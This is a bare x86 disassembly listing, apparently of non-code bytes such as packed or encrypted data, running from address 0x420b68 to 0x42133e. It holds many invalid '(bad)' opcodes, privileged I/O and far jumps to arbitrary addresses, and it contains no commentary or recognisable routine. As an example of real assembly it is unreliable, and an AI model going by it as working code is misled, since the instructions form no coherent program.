  420b68:	dec    ecx
  420b69:	pop    ds
  420b6a:	xor    esp,DWORD PTR [edx]
  420b6c:	jl     0x420af3
  420b6e:	mov    cl,BYTE PTR [esi]
  420b70:	push   ebp
  420b71:	pop    eax
  420b72:	lods   eax,DWORD PTR ds:[esi]
  420b73:	sbb    al,0x71
  420b75:	push   ebp
  420b76:	imul   edx,DWORD PTR [ecx-0x1d8179bc],0x64
  420b7d:	ret    
  420b7e:	sub    eax,0xb54d9433
  420b83:	outs   dx,DWORD PTR ds:[esi]
  420b84:	stc    
  420b85:	xor    eax,0x77c39940
  420b8a:	(bad)  
  420b8b:	js     0x420b9f
  420b8d:	dec    eax
  420b8e:	xchg   esi,eax
  420b8f:	xchg   edx,eax
  420b90:	mov    gs,WORD PTR [esi+0x4fc40938]
  420b96:	pop    ds
  420b97:	int    0xed
  420b99:	mov    edi,0xaff6f825
  420b9e:	scas   eax,DWORD PTR es:[edi]
  420b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ba0:	pop    esi
  420ba1:	or     bl,dh
  420ba3:	ins    BYTE PTR es:[edi],dx
  420ba4:	mov    dh,0x99
  420ba6:	aad    0x37
  420ba8:	mov    ch,0x3e
  420baa:	ret    
  420bab:	mov    BYTE PTR [edi+0x6b077ab5],dh
  420bb1:	xchg   ebx,eax
  420bb2:	push   ebx
  420bb3:	cdq    
  420bb4:	rol    BYTE PTR [ecx-0x70515643],0x64
  420bbb:	(bad)  
  420bbc:	mov    ds:0x6fa5dbbe,eax
  420bc1:	and    DWORD PTR [ecx+0x74],ebp
  420bc4:	xor    BYTE PTR [ecx-0x4b7ea67b],0x70
  420bcb:	cli    
  420bcc:	and    DWORD PTR [esi+0x56],edx
  420bcf:	xchg   esi,eax
  420bd0:	cmp    al,0x78
  420bd2:	push   eax
  420bd3:	retf   0x9917
  420bd6:	jns    0x420be3
  420bd8:	(bad)  
  420bd9:	mov    bh,BYTE PTR [ebx]
  420bdb:	cmp    ebp,DWORD PTR [edx-0x11203caf]
  420be1:	push   esp
  420be2:	dec    eax
  420be3:	dec    edi
  420be4:	loope  0x420bdd
  420be6:	add    DWORD PTR [ebp+0x29e20430],edi
  420bec:	add    cl,bl
  420bee:	sbb    esp,edx
  420bf0:	loopne 0x420bd4
  420bf2:	into   
  420bf3:	jmp    0x420bfe
  420bf5:	inc    ebp
  420bf6:	mov    eax,ds:0xc9a97824
  420bfb:	dec    edi
  420bfc:	mov    ebp,0xba5602e0
  420c01:	and    BYTE PTR [edi-0x1f],ch
  420c04:	inc    edi
  420c05:	sub    DWORD PTR [edi-0x4e],edx
  420c08:	imul   edi,DWORD PTR [ebp+eiz*4+0x9],0x56
  420c0d:	adc    ecx,DWORD PTR [eax]
  420c0f:	out    0xda,eax
  420c11:	cmp    eax,DWORD PTR [ebp+0x21d8f1c2]
  420c17:	xor    ecx,edx
  420c19:	adc    DWORD PTR [eax-0x4e],edi
  420c1c:	test   bh,0x3
  420c1f:	out    dx,al
  420c20:	addr16 jl 0x420c24
  420c23:	daa    
  420c24:	loopne 0x420c44
  420c26:	dec    ecx
  420c27:	xor    esp,DWORD PTR [ebx-0x3]
  420c2a:	popa   
  420c2b:	addr16 sub esp,ebp
  420c2e:	push   esp
  420c2f:	push   edx
  420c30:	sub    ch,bl
  420c32:	mov    ds:0xc37a2bcd,al
  420c37:	add    edx,DWORD PTR [eax+edx*8]
  420c3a:	sbb    BYTE PTR [esi],ch
  420c3c:	mov    esp,DWORD PTR [esi+0x9]
  420c3f:	xchg   esi,eax
  420c40:	and    DWORD PTR [eiz*8-0x12ced401],esi
  420c47:	imul   ecx,esi,0x54d7f6bc
  420c4d:	stos   BYTE PTR es:[edi],al
  420c4e:	sbb    ah,BYTE PTR [edx]
  420c50:	sbb    al,0xc4
  420c52:	rcr    dh,0xbe
  420c55:	rcl    eax,0xa7
  420c58:	sub    BYTE PTR [esi-0x6d],0x76
  420c5c:	mov    ch,0xb1
  420c5e:	mov    dh,0x99
  420c60:	bnd jne 0x420cd5
  420c63:	mov    BYTE PTR [esp+ecx*2-0x6b],bh
  420c67:	jne    0x420c4d
  420c69:	xor    BYTE PTR [eax+ecx*4-0xe81bedc],cl
  420c70:	adc    eax,0xf18647c1
  420c75:	add    eax,0xd2e57461
  420c7a:	push   esp
  420c7b:	test   al,0xc3
  420c7d:	scas   al,BYTE PTR es:[edi]
  420c7e:	xchg   BYTE PTR [esi],bl
  420c80:	sbb    dl,dl
  420c82:	sub    BYTE PTR [ebx-0x5c0bf20a],0xc3
  420c89:	xor    bh,BYTE PTR [edi]
  420c8b:	xchg   edi,eax
  420c8c:	fcomp  QWORD PTR [edx+esi*2]
  420c8f:	gs xchg esp,eax
  420c91:	or     DWORD PTR [ebp+0x62cec625],esp
  420c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c98:	loop   0x420cb5
  420c9a:	data16 jbe 0x420c53
  420c9d:	mov    eax,0xaa1eb179
  420ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ca3:	mov    ebx,0x9d09af35
  420ca8:	in     al,0xf3
  420caa:	xor    edx,edi
  420cac:	and    DWORD PTR [ebp-0x38],edi
  420caf:	jecxz  0x420d21
  420cb1:	retf   
  420cb2:	push   ss
  420cb3:	jecxz  0x420cc1
  420cb5:	add    eax,DWORD PTR [eax+0x70e52337]
  420cbb:	cmp    esp,DWORD PTR [ebp-0x75]
  420cbe:	push   ebx
  420cbf:	pop    ebx
  420cc0:	iret   
  420cc1:	push   edx
  420cc2:	cmp    esp,ebx
  420cc4:	cmp    DWORD PTR [edx-0x5b7e3009],esi
  420cca:	fwait
  420ccb:	(bad)  
  420ccc:	cmp    al,0xde
  420cce:	test   DWORD PTR [esi-0x302fd0bf],ebx
  420cd4:	das    
  420cd5:	push   ss
  420cd6:	jno    0x420cd7
  420cd8:	jmp    0x420c7c
  420cda:	mov    esp,es
  420cdc:	or     DWORD PTR [ecx+edx*4],esi
  420cdf:	sub    al,BYTE PTR ds:0x5946a59
  420ce5:	sbb    esp,DWORD PTR [eax]
  420ce7:	pushf  
  420ce8:	es clc 
  420cea:	into   
  420ceb:	push   ds
  420cec:	sti    
  420ced:	(bad)  
  420cee:	in     eax,0x1c
  420cf0:	jge    0x420c8f
  420cf2:	(bad)  
  420cf3:	fisub  WORD PTR [ecx]
  420cf5:	test   DWORD PTR [ecx],esi
  420cf7:	test   eax,0x28505911
  420cfc:	add    al,0x5d
  420cfe:	clc    
  420cff:	mov    ds:0xd8ebb355,eax
  420d04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d05:	sbb    eax,0x6de53382
  420d0a:	pop    ecx
  420d0b:	shl    eax,cl
  420d0d:	xchg   edx,eax
  420d0e:	nop
  420d0f:	inc    edx
  420d10:	xor    al,0xa8
  420d12:	lea    ecx,[ebx+0x71c96f7a]
  420d18:	jae    0x420d04
  420d1a:	int    0xb0
  420d1c:	xchg   esi,eax
  420d1d:	fldcw  WORD PTR [ecx-0x14]
  420d20:	(bad)  
  420d21:	and    dh,dl
  420d23:	out    0x47,al
  420d25:	inc    ebp
  420d26:	(bad)  
  420d28:	push   edx
  420d29:	lock jo 0x420cca
  420d2c:	jnp    0x420caf
  420d2e:	jge    0x420d67
  420d30:	mov    DWORD PTR [ecx-0x36],edx
  420d33:	je     0x420d35
  420d35:	or     al,0xfc
  420d37:	jle    0x420d43
  420d39:	cmp    al,0x4d
  420d3b:	pop    ss
  420d3c:	(bad)  
  420d3d:	outs   dx,DWORD PTR ds:[esi]
  420d3e:	sbb    bl,BYTE PTR [eax-0x57]
  420d41:	pop    edi
  420d42:	mov    eax,0xa0f879c5
  420d47:	jns    0x420d72
  420d49:	nop
  420d4a:	jae    0x420d25
  420d4c:	sti    
  420d4d:	hlt    
  420d4e:	adc    DWORD PTR [ecx],ebx
  420d50:	jb     0x420d45
  420d52:	jmp    0x19f6:0x7006b5e0
  420d59:	xor    edi,DWORD PTR [ecx+edi*4-0x16]
  420d5d:	mov    ds:0xe29bc807,al
  420d62:	jmp    0x4903:0x1075919b
  420d69:	dec    ebx
  420d6a:	adc    DWORD PTR [ecx],ebp
  420d6c:	sbb    cl,0x5a
  420d6f:	jmp    0x420def
  420d71:	les    ecx,FWORD PTR [edi]
  420d73:	cmp    BYTE PTR [esi+edx*1-0x61],bh
  420d77:	mov    esp,0x687b4d88
  420d7c:	xor    ebx,ecx
  420d7e:	inc    edx
  420d7f:	sub    ch,dh
  420d81:	aas    
  420d82:	fiadd  DWORD PTR [eax]
  420d84:	call   0x73159c4b
  420d89:	push   eax
  420d8a:	adc    BYTE PTR gs:[edx-0xc],ch
  420d8e:	out    0x67,eax
  420d90:	xchg   DWORD PTR ds:0x8910605b,esp
  420d96:	lds    esi,FWORD PTR [edi-0x3d]
  420d99:	retf   0x3149
  420d9c:	std    
  420d9d:	popf   
  420d9e:	sti    
  420d9f:	dec    edx
  420da0:	xchg   edi,eax
  420da1:	rol    BYTE PTR [edi+ebp*1],cl
  420da4:	add    esp,DWORD PTR [ebp-0x539ab705]
  420daa:	clc    
  420dab:	jmp    0x420d7d
  420dad:	(bad)  
  420dae:	out    0x33,al
  420db0:	xor    BYTE PTR [edi-0x24418541],dl
  420db6:	lock mov edx,0x6e8ee024
  420dbc:	mov    al,ds:0xd954121a
  420dc1:	mov    dl,0x30
  420dc3:	dec    ebx
  420dc4:	adc    DWORD PTR [esi+0x60131af2],esp
  420dca:	adc    ebp,DWORD PTR [ecx-0x3f35e1a5]
  420dd0:	mov    esp,0x7a507914
  420dd5:	push   esp
  420dd6:	cmp    dh,BYTE PTR [edi-0x18531de]
  420ddc:	and    BYTE PTR [ebp-0x587a0406],bl
  420de2:	aas    
  420de3:	mov    ebp,0xcd4b6730
  420de8:	jp     0x420d81
  420dea:	dec    ecx
  420deb:	or     bh,BYTE PTR [eax]
  420ded:	dec    edx
  420dee:	xchg   DWORD PTR [ebx],ebx
  420df0:	sahf   
  420df1:	js     0x420d85
  420df3:	push   ebp
  420df4:	cld    
  420df5:	data16 (bad) 
  420df7:	lea    esp,[esp+eiz*2+0x1d]
  420dfb:	int3   
  420dfc:	sbb    DWORD PTR [esi+esi*8-0x27],0x65
  420e01:	rcl    BYTE PTR [ebx+0x4d],0x3a
  420e05:	add    ebp,edi
  420e07:	imul   esp,DWORD PTR [edi-0x8],0x6a08c80e
  420e0e:	stc    
  420e0f:	add    al,0x6
  420e11:	adc    cl,cl
  420e13:	imul   esp,DWORD PTR [edi],0xffffff86
  420e16:	add    eax,0x753940a1
  420e1b:	sbb    BYTE PTR [eax-0x35833146],ch
  420e21:	rcl    DWORD PTR [ecx+0x41c63145],1
  420e27:	fdiv   st(1),st
  420e29:	sub    eax,0x5d801248
  420e2e:	(bad)  ds:0x2b3dd7a8
  420e34:	push   eax
  420e35:	mov    ch,al
  420e37:	stos   DWORD PTR es:[edi],eax
  420e38:	xchg   esi,eax
  420e39:	inc    ecx
  420e3a:	int    0x67
  420e3c:	pop    es
  420e3d:	std    
  420e3e:	push   cs
  420e3f:	or     dh,BYTE PTR [edi-0x4dabb5e]
  420e45:	clc    
  420e46:	(bad)  
  420e47:	fldenv [edx-0x58]
  420e4a:	sbb    eax,0x963db610
  420e4f:	xchg   ebp,eax
  420e50:	sbb    DWORD PTR [edi-0x20],ebp
  420e53:	cmp    edx,DWORD PTR [ecx+ebx*1]
  420e56:	bndstx [ebx+0x86b94b8],(bad)
  420e5d:	in     eax,0x3a
  420e5f:	cld    
  420e60:	ins    BYTE PTR es:[edi],dx
  420e61:	dec    ecx
  420e62:	adc    DWORD PTR [ecx-0x46],esi
  420e65:	stos   DWORD PTR es:[edi],eax
  420e66:	shr    esi,cl
  420e68:	push   esp
  420e69:	push   cs
  420e6a:	int3   
  420e6b:	add    BYTE PTR [ecx-0x44],ah
  420e6e:	popa   
  420e6f:	push   eax
  420e70:	push   eax
  420e71:	mov    ebp,0xbec23665
  420e76:	mov    WORD PTR [edi+0x7bf3b7ec],fs
  420e7c:	pushf  
  420e7d:	lea    esi,[ecx-0x7214cb59]
  420e83:	dec    edi
  420e84:	xchg   ebx,eax
  420e85:	push   eax
  420e86:	ror    DWORD PTR [esi-0x6f054acf],cl
  420e8c:	xor    ah,BYTE PTR [esi-0x2419c5d6]
  420e92:	test   BYTE PTR [edi+ecx*8+0x7f],dh
  420e96:	inc    ebp
  420e97:	cmc    
  420e98:	inc    esi
  420e99:	pushf  
  420e9a:	xor    eax,0x31207d07
  420e9f:	xor    ch,BYTE PTR [edi]
  420ea1:	test   al,0x96
  420ea3:	jno    0x420ea1
  420ea5:	push   ebx
  420ea6:	cs cli 
  420ea8:	push   ds
  420ea9:	mov    ds:0x251f9be5,al
  420eae:	sub    al,0xb
  420eb0:	mov    cl,BYTE PTR [esi]
  420eb2:	push   cs
  420eb3:	fdiv   st,st(6)
  420eb5:	push   esi
  420eb6:	mov    al,ds:0xffd68b74
  420ebb:	jnp    0x420edb
  420ebd:	jb     0x420e5d
  420ebf:	pop    edi
  420ec0:	xchg   ecx,eax
  420ec1:	ds iret 
  420ec3:	bound  edi,QWORD PTR [ebx]
  420ec5:	(bad)  
  420ec6:	pop    eax
  420ec7:	push   esi
  420ec8:	sub    DWORD PTR [edi+0x159e92cd],edi
  420ece:	aaa    
  420ecf:	inc    ecx
  420ed0:	loopne 0x420e6c
  420ed2:	pushf  
  420ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ed4:	mov    ebx,0xb0a5b59f
  420ed9:	jb     0x420e5c
  420edb:	and    eax,0x5c15e6cd
  420ee0:	push   edx
  420ee1:	adc    eax,0x4cc3ff61
  420ee6:	mov    ebp,0x45e803a0
  420eeb:	retf   
  420eec:	push   ebx
  420eed:	popf   
  420eee:	arpl   WORD PTR [eax+0x2],ax
  420ef1:	mov    esi,0x6e820d04
  420ef6:	int    0xc3
  420ef8:	je     0x420ee3
  420efa:	mov    WORD PTR [edx],ds
  420efc:	bound  eax,QWORD PTR [esi-0x55]
  420eff:	fs sub eax,0x1fca3ba0
  420f05:	stc    
  420f06:	arpl   WORD PTR ds:0xf24dd8da,bp
  420f0c:	jae    0x420ecc
  420f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f0f:	jmp    0x3c08:0x18b38e35
  420f16:	or     al,0x81
  420f18:	sbb    eax,DWORD PTR [ebx]
  420f1a:	inc    edx
  420f1b:	mov    BYTE PTR [edx+0x3c],bh
  420f1e:	add    ah,BYTE PTR [edx+0x5a]
  420f21:	and    al,dl
  420f23:	add    BYTE PTR [edi-0x3e],0xca
  420f27:	push   esp
  420f28:	mov    ecx,0xc3327c83
  420f2d:	dec    ebp
  420f2e:	sbb    bh,BYTE PTR [edi-0x29e7e9ce]
  420f34:	int    0xe
  420f36:	mov    bl,0x36
  420f38:	scas   al,BYTE PTR es:[edi]
  420f39:	or     dl,BYTE PTR [edx+ebx*2+0x39]
  420f3d:	imul   esp,DWORD PTR [esi-0x1d],0xc2dd0adc
  420f44:	pop    edx
  420f45:	sbb    al,BYTE PTR [ebx-0x20ca4e58]
  420f4b:	aam    0x57
  420f4d:	xor    ah,BYTE PTR [ecx]
  420f4f:	popa   
  420f50:	mov    ds:0xe048ee84,eax
  420f55:	mov    ds:0x2c1da69f,eax
  420f5a:	jae    0x420f61
  420f5c:	jmp    0xf983fdea
  420f61:	(bad)  
  420f62:	push   ss
  420f63:	hlt    
  420f64:	outs   dx,BYTE PTR ds:[esi]
  420f65:	xor    esi,DWORD PTR [edi+0xa0d75e6]
  420f6b:	(bad)  
  420f6c:	lea    ebx,cs:0xc4a07f42
  420f73:	stos   BYTE PTR es:[edi],al
  420f74:	fsub   QWORD PTR [esi]
  420f76:	outs   dx,DWORD PTR ds:[esi]
  420f77:	and    al,BYTE PTR ds:0x883fa11
  420f7d:	xor    dl,BYTE PTR [ecx]
  420f7f:	sbb    ch,BYTE PTR ds:0xbed10b47
  420f85:	mov    dh,0x7a
  420f87:	ja     0x420f94
  420f89:	lock cmp BYTE PTR [esi],dh
  420f8c:	dec    ebx
  420f8d:	bound  esp,QWORD PTR [eax-0x39]
  420f90:	repz mov eax,0xe71a547f
  420f96:	arpl   WORD PTR es:[esi],bp
  420f99:	cli    
  420f9a:	std    
  420f9b:	les    ebp,FWORD PTR [ebx+eax*4-0x69]
  420f9f:	jo     0x420f44
  420fa1:	outs   dx,BYTE PTR ds:[esi]
  420fa2:	shl    edi,0xec
  420fa5:	or     ecx,DWORD PTR [edx]
  420fa7:	adc    ch,dl
  420fa9:	or     DWORD PTR [ebp-0x5b],ecx
  420fac:	test   DWORD PTR [ecx-0x498f6daf],edx
  420fb2:	and    DWORD PTR gs:0x889ad13d,ebx
  420fb9:	and    eax,DWORD PTR [edi]
  420fbb:	or     bh,ah
  420fbd:	(bad)  
  420fbe:	pop    esp
  420fbf:	out    dx,eax
  420fc0:	call   0xb21d188d
  420fc5:	mov    al,0x27
  420fc7:	add    DWORD PTR [ebx+0x26],edx
  420fca:	cmp    BYTE PTR [edx],ah
  420fcc:	test   al,0x24
  420fce:	pop    ds
  420fcf:	nop
  420fd0:	or     al,0xd5
  420fd2:	lds    esp,FWORD PTR ds:0x98a2669
  420fd8:	fcomp  QWORD PTR [edi]
  420fda:	add    al,0xe1
  420fdc:	aad    0xb
  420fde:	fcomp  QWORD PTR [ecx-0x22f49ec]
  420fe4:	sbb    DWORD PTR [ebp-0x5677ed72],esi
  420fea:	or     edi,DWORD PTR ds:0x5643575d
  420ff0:	in     eax,dx
  420ff1:	mov    al,0xa4
  420ff3:	cs cwde 
  420ff5:	xchg   edx,eax
  420ff6:	add    DWORD PTR [ebx-0x5c],0xffffffff
  420ffa:	gs jo  0x420ffb
  420ffd:	or     BYTE PTR ds:0xd71219c3,dl
  421003:	mov    dl,BYTE PTR ds:0xa4ecd7b0
  421009:	cmp    edi,esp
  42100b:	in     al,0x7a
  42100d:	pop    esp
  42100e:	cwd    
  421010:	fwait
  421011:	(bad)  
  421012:	mov    fs,WORD PTR [ebx-0x4e]
  421015:	stos   BYTE PTR es:[edi],al
  421016:	pushf  
  421017:	jne    0x420ff8
  421019:	sbb    eax,0x8caf8bf6
  42101e:	dec    ecx
  42101f:	aad    0x19
  421021:	scas   eax,DWORD PTR es:[edi]
  421022:	enter  0x540d,0xad
  421026:	pusha  
  421027:	dec    eax
  421028:	mov    ds:0x2fbd69de,al
  42102d:	pop    edi
  42102e:	lea    esp,[ecx+0xf]
  421031:	arpl   WORD PTR [esi-0x50f79f44],si
  421037:	inc    ebx
  421038:	(bad)  
  421039:	out    dx,al
  42103a:	cli    
  42103b:	mov    esp,0xecebb499
  421040:	pop    esi
  421041:	(bad)  
  421043:	sbb    al,0x67
  421045:	push   0x3d
  421047:	and    DWORD PTR [ebx],edx
  421049:	pusha  
  42104a:	pop    ebp
  42104b:	fimul  DWORD PTR [ebx+0x48401ed4]
  421051:	xor    DWORD PTR [esi-0x56],ebx
  421054:	inc    ebx
  421055:	(bad)  
  421056:	hlt    
  421057:	mov    esp,0xfbad2460
  42105c:	cmp    eax,0xbc4d56dd
  421061:	in     eax,dx
  421062:	js     0x420ffa
  421064:	pop    ss
  421065:	jg     0x421099
  421067:	push   ebp
  421068:	sub    esp,DWORD PTR [edx+edx*1-0x6364f868]
  42106f:	dec    edi
  421070:	fisttp DWORD PTR [ebp-0x67]
  421073:	mov    ah,0xa6
  421075:	call   0x40f7d9fe
  42107a:	lods   eax,DWORD PTR ds:[esi]
  42107b:	cs or  al,0xeb
  42107e:	cli    
  42107f:	js     0x42105d
  421081:	dec    ecx
  421082:	or     al,0xbc
  421084:	mov    ch,0x9f
  421086:	add    ecx,DWORD PTR [ebp+0x240e8c32]
  42108c:	scas   eax,DWORD PTR es:[edi]
  42108d:	adc    eax,DWORD PTR [edi+0x7b]
  421090:	jmp    0x421020
  421092:	sub    edi,DWORD PTR [ebx]
  421094:	gs pop ss
  421096:	daa    
  421097:	ret    0x9ac6
  42109a:	mov    esp,DWORD PTR [ecx+0x49]
  42109d:	mov    eax,DWORD PTR fs:[eax-0x2d]
  4210a1:	in     eax,0x74
  4210a3:	push   es
  4210a4:	cmp    DWORD PTR [ebx+0x6d],esi
  4210a7:	adc    eax,0xf35fc574
  4210ac:	std    
  4210ad:	(bad)  
  4210ae:	ficom  WORD PTR [edi]
  4210b0:	adc    BYTE PTR [ecx*8-0x2949d268],0x72
  4210b8:	or     DWORD PTR [ecx],esi
  4210ba:	jae    0x421106
  4210bc:	aaa    
  4210bd:	or     cl,BYTE PTR [edx+0x34]
  4210c0:	mov    ds:0x27a5d478,eax
  4210c5:	scas   al,BYTE PTR es:[edi]
  4210c6:	xchg   ebp,eax
  4210c7:	or     BYTE PTR [esi],cl
  4210c9:	inc    edx
  4210ca:	add    esi,DWORD PTR [ecx-0x3e39ec1b]
  4210d0:	pop    ss
  4210d1:	cld    
  4210d2:	mov    ds:0xf9cffd68,al
  4210d7:	rcr    BYTE PTR [ebx],1
  4210d9:	std    
  4210da:	add    eax,0x39fa3181
  4210df:	pop    es
  4210e0:	mov    cl,dh
  4210e2:	mov    DWORD PTR [ecx],esi
  4210e4:	das    
  4210e5:	rol    BYTE PTR [esi-0x5],cl
  4210e8:	and    eax,esi
  4210ea:	ins    BYTE PTR es:[edi],dx
  4210eb:	call   0xfbb0:0x8710b861
  4210f2:	and    DWORD PTR [ebx],ebx
  4210f4:	pop    eax
  4210f5:	mov    ebx,0x5443b8fc
  4210fa:	mov    al,ds:0xf798d046
  4210ff:	jge    0x4210bc
  421101:	xor    DWORD PTR [ebx+ecx*8+0x651d9f92],0x28
  421109:	mov    edi,0x4608f046
  42110e:	outs   dx,BYTE PTR ds:[esi]
  42110f:	adc    ebx,edx
  421111:	pop    DWORD PTR [eax]
  421113:	mov    esp,0xc362871b
  421118:	pop    ecx
  421119:	sub    eax,0x21b9a9c9
  42111e:	fidivr WORD PTR [ebx+0x788238e6]
  421124:	out    dx,al
  421125:	ins    DWORD PTR es:[edi],dx
  421126:	repnz mov dl,0x30
  421129:	popa   
  42112a:	adc    al,0x9f
  42112c:	pushf  
  42112d:	mov    eax,0x57241ed5
  421132:	xchg   ebx,eax
  421133:	addr16 int 0x8
  421136:	sbb    al,0x96
  421138:	dec    ebp
  421139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42113a:	mov    dl,0x81
  42113c:	es dec ebp
  42113e:	sub    ebp,eax
  421140:	dec    edi
  421141:	jno    0x42112e
  421143:	and    ebp,DWORD PTR [eax+0x1f81c7de]
  421149:	adc    ecx,ebp
  42114b:	mov    ch,0x3c
  42114d:	jle    0x4211ce
  42114f:	push   es
  421150:	add    esi,DWORD PTR [edi+0x6a9d2ab5]
  421156:	imul   edi,DWORD PTR gs:[esp+edx*4-0x1f],0x687eb2a2
  42115f:	cmp    DWORD PTR [eax],esi
  421161:	inc    ebx
  421162:	xchg   edi,eax
  421163:	xor    al,0x88
  421165:	call   0xe17b:0x32439158
  42116c:	mov    ds,WORD PTR [ebx-0x2a8e68aa]
  421172:	cmp    al,0xd4
  421174:	repnz dec ecx
  421176:	and    esi,DWORD PTR [ebx-0x4b]
  421179:	xor    al,0x12
  42117b:	jecxz  0x421166
  42117d:	jp     0x4211ee
  42117f:	cmp    DWORD PTR [eax+0x7850dcc7],esi
  421185:	mov    DWORD PTR [ebx-0x75],ebp
  421188:	sub    BYTE PTR [eax+esi*2],0xd5
  42118c:	cld    
  42118d:	inc    esp
  42118e:	out    0x57,eax
  421190:	arpl   WORD PTR [ecx+0x79],bp
  421193:	jbe    0x4211d4
  421195:	int    0xa4
  421197:	pop    ecx
  421198:	(bad)  
  421199:	lock test BYTE PTR [esi+ecx*1+0x50],bh
  42119e:	fs xchg ecx,eax
  4211a0:	cwde   
  4211a1:	xchg   edx,eax
  4211a2:	jmp    0x517dd62d
  4211a7:	mov    al,ds:0xec122794
  4211ac:	sbb    dl,BYTE PTR [esi-0x67]
  4211af:	test   eax,0x88c8c877
  4211b4:	inc    esp
  4211b5:	jge    0x421224
  4211b7:	adc    eax,0xf7165a97
  4211bc:	shr    BYTE PTR [ecx-0x21],0xa7
  4211c0:	mov    ds:0xc81e11f,eax
  4211c5:	adc    al,dl
  4211c7:	iret   
  4211c8:	aam    0x69
  4211ca:	repz leave 
  4211cc:	cmp    eax,0xbb231060
  4211d1:	jmp    0x17166cb8
  4211d6:	dec    ecx
  4211d7:	cmp    al,0x48
  4211d9:	and    bh,BYTE PTR [eax]
  4211db:	sub    ch,bh
  4211dd:	mov    al,BYTE PTR [esi]
  4211df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211e0:	pop    edi
  4211e1:	and    eax,edx
  4211e3:	xlat   BYTE PTR ds:[ebx]
  4211e4:	sbb    si,WORD PTR [eax]
  4211e7:	out    dx,al
  4211e8:	retf   
  4211e9:	inc    esp
  4211ea:	cmp    eax,0xc33dc829
  4211ef:	fbstp  TBYTE PTR [edx+0x4f]
  4211f2:	ret    0xa204
  4211f5:	aas    
  4211f6:	outs   dx,DWORD PTR ds:[esi]
  4211f7:	sbb    edi,ebx
  4211f9:	lea    eax,[ecx+esi*8-0x7784505f]
  421200:	in     al,0xaf
  421202:	add    DWORD PTR [ebx+0x36692a2d],ebx
  421208:	jbe    0x4211c7
  42120a:	das    
  42120b:	xor    ch,bl
  42120d:	xor    DWORD PTR [edx+0x70],edi
  421210:	mov    esp,0xd50b0b42
  421215:	rcr    DWORD PTR [ecx],1
  421217:	mov    ds:0x838c8c1b,al
  42121c:	dec    esi
  42121d:	and    al,0x53
  42121f:	pop    esi
  421220:	jo     0x42122a
  421222:	fdiv   DWORD PTR [ecx]
  421224:	(bad)  
  421225:	xchg   edx,eax
  421226:	loope  0x421282
  421228:	xchg   ebp,eax
  421229:	into   
  42122a:	or     esi,DWORD PTR [ecx+0x32]
  42122d:	or     dl,ah
  42122f:	je     0x4211d7
  421231:	xchg   ebp,eax
  421232:	push   0xffffff8b
  421234:	iret   
  421235:	cmp    ebp,ebp
  421237:	call   0x69de3d66
  42123c:	(bad)  
  42123e:	icebp  
  42123f:	pop    ss
  421240:	(bad)  
  421242:	(bad)  
  421243:	cdq    
  421244:	xlat   BYTE PTR ds:[ebx]
  421245:	imul   esi,DWORD PTR [ebp-0x6d592a02],0xb2ab34a6
  42124f:	fcom   st(4)
  421251:	xor    eax,0x2a7613fc
  421256:	cdq    
  421257:	ins    DWORD PTR es:[edi],dx
  421258:	repz push edx
  42125a:	mov    ecx,0x76a55508
  42125f:	(bad)  
  421260:	in     al,dx
  421261:	nop
  421262:	mov    esi,0x12a99fd2
  421267:	dec    esi
  421268:	mov    ds:0x6624a8d4,al
  42126d:	add    DWORD PTR [ecx],ebx
  42126f:	leave  
  421270:	mul    esi
  421272:	scas   al,BYTE PTR es:[edi]
  421273:	sub    al,0xb1
  421275:	bound  ebx,QWORD PTR [ebx-0x35]
  421278:	push   edx
  421279:	push   0xf3b49fb5
  42127e:	popa   
  42127f:	dec    esi
  421280:	cmc    
  421281:	sbb    eax,0xec0febfc
  421286:	ja     0x421289
  421288:	xor    bh,BYTE PTR [edx-0x4d]
  42128b:	pop    ds
  42128c:	sbb    esi,ebp
  42128e:	lods   al,BYTE PTR ds:[esi]
  42128f:	cmp    edx,0x5104a248
  421295:	or     eax,0xc7a16f92
  42129a:	and    edi,DWORD PTR [edi+0x6e]
  42129d:	jecxz  0x4212d1
  42129f:	mov    WORD PTR [eax],?
  4212a1:	push   edi
  4212a2:	outs   dx,DWORD PTR ds:[esi]
  4212a3:	leave  
  4212a4:	add    dh,BYTE PTR [edi]
  4212a6:	mov    ds:0x8fc14396,eax
  4212ab:	dec    edi
  4212ac:	mov    DWORD PTR [eax-0x5f27c5f3],ecx
  4212b2:	sbb    eax,0x9e19fe62
  4212b7:	lahf   
  4212b8:	mov    al,0xc7
  4212ba:	xlat   BYTE PTR ds:[ebx]
  4212bb:	jecxz  0x4212b0
  4212bd:	(bad)  
  4212bf:	test   al,0x55
  4212c1:	mov    al,0x3b
  4212c3:	int    0x50
  4212c5:	jne    0x4212d2
  4212c7:	(bad)  ds:0x9bb20765
  4212cd:	ret    0x351b
  4212d0:	mov    BYTE PTR [edx+0x30],al
  4212d3:	mov    ecx,0xf63d5d06
  4212d8:	lods   al,BYTE PTR ds:[esi]
  4212d9:	jae    0x42125d
  4212db:	cld    
  4212dc:	(bad)  
  4212dd:	cld    
  4212de:	icebp  
  4212df:	mov    esi,0x1a9001bb
  4212e4:	jmp    0xe130:0x1b7f9b3d
  4212eb:	dec    esp
  4212ec:	js     0x42128a
  4212ee:	mov    cl,0x40
  4212f0:	jl     0x421310
  4212f2:	clc    
  4212f3:	std    
  4212f4:	push   ss
  4212f5:	imul   edx,DWORD PTR [esi],0x642042f2
  4212fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212fc:	push   es
  4212fd:	cdq    
  4212fe:	imul   esi,DWORD PTR [edx],0xee1d3d1
  421304:	stos   DWORD PTR es:[edi],eax
  421305:	stc    
  421306:	mov    eax,DWORD PTR ds:[ecx]
  421309:	sub    eax,0x323a149
  42130e:	in     al,0x37
  421310:	and    DWORD PTR [esp+ebp*1+0x7f22c6b4],0xb20b503e
  42131b:	(bad)  
  42131c:	adc    ebx,DWORD PTR ds:0xfeac22e9
  421322:	and    DWORD PTR [ebx],edx
  421324:	pop    esp
  421325:	push   0x50
  421327:	add    DWORD PTR [eax+0x38265e36],ebx
  42132d:	cmp    BYTE PTR [edx+edi*8-0x791a1355],cl
  421334:	imul   ecx,DWORD PTR [eax+0x7f29ea0f],0x794350d4
  42133e:	jne    0x4213a3
